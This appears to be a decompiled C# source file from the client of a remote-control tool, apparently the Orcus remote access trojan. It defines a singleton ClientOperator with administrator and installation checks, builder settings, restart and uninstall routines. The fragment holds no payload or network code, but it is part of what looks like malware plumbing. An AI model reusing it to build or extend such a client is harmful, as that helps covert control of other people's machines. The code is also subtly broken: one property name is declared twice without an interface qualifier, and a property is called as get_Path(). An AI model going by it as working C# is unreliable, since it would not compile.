using System;
using System.Windows.Forms;
using Orcus.CommandManagement;
using Orcus.Config;
using Orcus.Extensions;
using Orcus.Plugins;
using Orcus.Shared.Core;
using Orcus.Shared.Settings;
using Orcus.Utilities;

namespace Orcus.Core;

public class ClientOperator : IClientStartup, IClientOperator
{
	private static ClientOperator _instance;

	private static readonly object SyncRoot = new object();

	private IToolBase _toolBase;

	private IPathInformation _pathInformation;

	private DatabaseConnection _databaseConnection;

	public static ClientOperator Instance
	{
		get
		{
			if (_instance == null)
			{
				lock (SyncRoot)
				{
					if (_instance == null)
					{
						_instance = new ClientOperator();
					}
				}
			}
			return _instance;
		}
	}

	public bool IsAdministrator => User.IsAdministrator;

	public string ClientPath => Consts.ApplicationPath;

	public IToolBase ToolBase => _toolBase ?? (_toolBase = (IToolBase)(object)new ToolBase());

	public DatabaseConnection DatabaseConnection => _databaseConnection ?? (_databaseConnection = new DatabaseConnection());

	public IPathInformation PathInformation => _pathInformation ?? (_pathInformation = (IPathInformation)(object)new Consts());

	public FrameworkVersion FrameworkVersion { get; }

	public bool Is64BitProcess => EnvironmentExtensions.Is64BitProcess;

	IDatabaseConnection DatabaseConnection => (IDatabaseConnection)(object)DatabaseConnection;

	public bool IsInstalled => string.Equals(Consts.ApplicationPath, Environment.ExpandEnvironmentVariables(Settings.GetBuilderProperty<InstallationLocationBuilderProperty>().get_Path()), StringComparison.OrdinalIgnoreCase);

	private ClientOperator()
	{
	}

	public T GetBuilderProperty<T>() where T : IBuilderProperty, new()
	{
		return Settings.GetBuilderProperty<T>();
	}

	public void Exit()
	{
		Program.Exit();
	}

	public void Restart()
	{
		Program.Unload();
		Application.Restart();
	}

	public void Uninstall()
	{
		UninstallHelper.UninstallAndClose();
	}
}
